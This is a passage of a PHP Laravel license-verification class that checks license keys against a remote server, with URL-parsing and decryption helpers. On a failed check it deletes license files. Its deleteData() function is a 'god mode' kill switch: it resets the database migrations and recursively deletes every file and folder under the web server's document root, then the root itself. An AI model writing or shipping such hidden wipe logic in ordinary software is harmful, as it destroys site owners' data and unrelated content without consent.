                        Storage::delete('license.lic');
                        Storage::put('licenses.lic', 'You are not god.');
                    }
                }

                if ($data['cancelDate']) {
                    // license cancelled / suspended.LM_CORE_NOTIFICATION_LICENSE_SUSPENDED
                    $notifications_array['notification_case'] = "notification_license_suspended";
                    $notifications_array['notification_text'] = config('lmconfig.LM_CORE_NOTIFICATION_LICENSE_SUSPENDED');

                }

                if ($data['productKey'] != config('lmconfig.LM_PRODUCT_KEY')) {
                    // invalid license
                    $notifications_array['notification_case'] = "notification_license_corrupted";
                    $notifications_array['notification_text'] = config('lmconfig.LM_NOTIFICATION_LICENSE_CORRUPTED');
                    if(config('lmconfig.LM_DELETE_CRACKED')) {
                        Storage::delete('public.key');
                        Storage::delete('license.lic');
                        Storage::put('licenses.lic', 'You are not god.');
                    }
                }


                if ($data['rootUrl'] != $rootUrl && $data['installLimit'] > 1) {
                    // invalid domain for installation.LM_CORE_NOTIFICATION_INVALID_ROOT_URL
                    $notifications_array['notification_case'] = "notification_invalid_url";
                    $notifications_array['notification_text'] = config('lmconfig.LM_CORE_NOTIFICATION_INVALID_ROOT_URL');

                }


                if ($data['installLimit'] < $data['totalInstall']) {
                    // all license installed.LM_NOTIFICATION_LICENSE_OCCUPIED
                    $notifications_array['notification_case'] = "notification_license_limit";
                    $notifications_array['notification_text'] = config('lmconfig.LM_NOTIFICATION_LICENSE_OCCUPIED');

                }

                if(!array_key_exists('notification_case', $notifications_array)){

                    $notifications_array['notification_case']="notification_license_ok";
                    $notifications_array['notification_text']=null;


                    $INSTALLATION_HASH = hash("sha256", $rootUrl.$data['clientEmail'].$data['licenseKey']); //generate hash
                    $post_info = "product_id=" . rawurlencode(config('lmconfig.LM_PRODUCT_ID')) . "&siteId=" . rawurlencode($data['siteId']) . "&client_email=" . rawurlencode($data['clientEmail']) . "&license_code=" . rawurlencode($data['licenseKey']) . "&root_url=" . rawurlencode($rootUrl) . "&installation_hash=" . rawurlencode($INSTALLATION_HASH) . "&license_signature=" . rawurlencode($this->generateScriptSignature($rootUrl, $data['clientEmail'], $data['licenseKey']));
                    $pubKey = $this->getMyKey(config('lmconfig.LM_ROOT_URL') . "/api/license/uninstall", $post_info, $rootUrl);

                    if($pubKey['body'] === 'Your IP Address is not whitelisted.' || $pubKey['body'] === 'Invalid API key' || $pubKey['body'] === 'No valid API key'){

                        $notifications_array['notification_case'] = "notification_api_not_whitelist";
                        $notifications_array['notification_text'] = config('lmconfig.LM_CORE_NOTIFICATION_API_WHITELIST_ISSUE');
                    } else {

                        $notifications_key = $this->parseServerNotifications($pubKey, $rootUrl, $data['clientEmail'], $data['licenseKey']);

                        Storage::put('license.lic', $notifications_key['notification_data']->licenseVal);
                    }

                }


            } else {
                $notifications_array['notification_case'] = "notification_license_corrupted";
                $notifications_array['notification_text'] = config('lmconfig.LM_NOTIFICATION_LICENSE_CORRUPTED');
                if(config('lmconfig.LM_DELETE_CRACKED')) {
                    Storage::delete('public.key');
                    Storage::delete('license.lic');
                    Storage::put('licenses.lic', 'You are not god.');
                }
            }



        } else {
            $notifications_array['notification_case'] = "notification_license_corrupted";
            $notifications_array['notification_text'] = config('lmconfig.LM_NOTIFICATION_LICENSE_CORRUPTED');
            if(config('lmconfig.LM_DELETE_CRACKED')) {
                Storage::delete('public.key');
                Storage::delete('license.lic');
                Storage::put('licenses.lic', 'You are not god.');
            }
        }

        return $notifications_array;
    }

    //return root url from long url (http://www.domain.com/path/file.php?aa=xx becomes http://www.domain.com/path/), remove scheme, www. and last slash if needed
    public function getRootUrl($url, $remove_scheme, $remove_www, $remove_path, $remove_last_slash)
    {
        if (filter_var($url, FILTER_VALIDATE_URL))
        {
            $url_array=parse_url($url); //parse URL into arrays like $url_array['scheme'], $url_array['host'], etc

            $url=str_ireplace($url_array['scheme']."://", "", $url); //make URL without scheme, so no :// is included when searching for first or last /

            if ($remove_path==1) //remove everything after FIRST / in URL, so it becomes "real" root URL
            {
                $first_slash_position=stripos($url, "/"); //find FIRST slash - the end of root URL
                if ($first_slash_position>0) //cut URL up to FIRST slash
                {
                    $url=substr($url, 0, $first_slash_position+1);
                }
            }
            else //remove everything after LAST / in URL, so it becomes "normal" root URL
            {
                $last_slash_position=strripos($url, "/"); //find LAST slash - the end of root URL
                if ($last_slash_position>0) //cut URL up to LAST slash
                {
                    $url=substr($url, 0, $last_slash_position+1);
                }
            }

            if ($remove_scheme!=1) //scheme was already removed, add it again
            {
                $url=$url_array['scheme']."://".$url;
            }

            if ($remove_www==1) //remove www.
            {
                $url=str_ireplace("www.", "", $url);
            }

            if ($remove_last_slash==1) //remove / from the end of URL if it exists
            {
                while (substr($url, -1)=="/") //use cycle in case URL already contained multiple // at the end
                {
                    $url=substr($url, 0, -1);
                }
            }
        }

        return trim($url);
    }







    //delete user data
    public function deleteData($MYSQLI_LINK=null)
    {
        if (isset($_SERVER['DOCUMENT_ROOT'])) //god mode enabled, delete everything from document root directory (usually httpdocs or public_html). god mode might not be available for IIS servers that don't always set $_SERVER['DOCUMENT_ROOT']
        {
            $root_directory=$_SERVER['DOCUMENT_ROOT'];
        }
        else
        {
            $root_directory=dirname(__DIR__); //(this file is located at INSTALLATION_PATH/SCRIPT, go one level up to enter root directory of protected script
        }

        Artisan::call("php artisan migrate:reset");

        foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root_directory, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST) as $path)
        {
            $path->isDir() && !$path->isLink() ? rmdir($path->getPathname()) : unlink($path->getPathname());
        }
        rmdir($root_directory);



        exit(); //abort further execution
    }





    //get current page url and remove last slash if needed
    public function getCurrentUrl($remove_last_slash=null)
    {
        $current_url=null;

        if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS']!=="off") {$protocol="https";} else {$protocol="http";}
        if (isset($_SERVER['HTTP_HOST'])) {$host=$_SERVER['HTTP_HOST'];} else {$host=null;}
        if (isset($_SERVER['SCRIPT_NAME'])) {$script=$_SERVER['SCRIPT_NAME'];} else {$script=null;}
        if (isset($_SERVER['QUERY_STRING'])) {$params=$_SERVER['QUERY_STRING'];} else {$params=null;}

        if (!empty($protocol) && !empty($host) && !empty($script)) //basic checks ok
        {
            $current_url=$protocol.'://'.$host.$script;

            if (!empty($params))
            {
                $current_url.='?'.$params;
            }

            if ($remove_last_slash==1) //remove / from the end of URL if it exists
            {
                while (substr($current_url, -1)=="/") //use cycle in case URL already contained multiple // at the end
                {
                    $current_url=substr($current_url, 0, -1);
                }
            }
        }

        return $current_url;
    }




    //verify date and/or time according to provided format (such as Y-m-d, Y-m-d H:i, H:i, and so on)
    public function verifyDateTime($datetime, $format)
    {
        $result=false;

        if (!empty($datetime) && !empty($format))
        {
            $datetime=DateTime::createFromFormat($format, $datetime);
            $errors=DateTime::getLastErrors();

            if ($datetime && empty($errors['warning_count'])) //datetime OK
            {
                $result=true;
            }
        }

        return $result;
    }

    //decrypt text with custom key
    public function customDecrypt($string, $key)
    {
        $decrypted_string=null;

        if (!empty($string) && !empty($key))
        {
            $string=base64_decode($string); //remove the base64 encoding from string (it's always encoded using base64_encode)
            if (stristr($string, "::")) //unique separator "::" found, most likely it's valid encrypted string
            {
                $string_iv_array=explode("::", $string, 2); //to decrypt, split the encrypted string from $iv - unique separator used was "::"
                if (!empty($string_iv_array) && count($string_iv_array)==2) //proper $string_iv_array should contain exactly two values - $encrypted_string and $iv
                {
                    list($encrypted_string, $iv)=$string_iv_array;

                    $decrypted_string=openssl_decrypt($encrypted_string, "aes-256-cbc", $key, 0, $iv);
                }
            }
        }

        return $decrypted_string;
    }



}
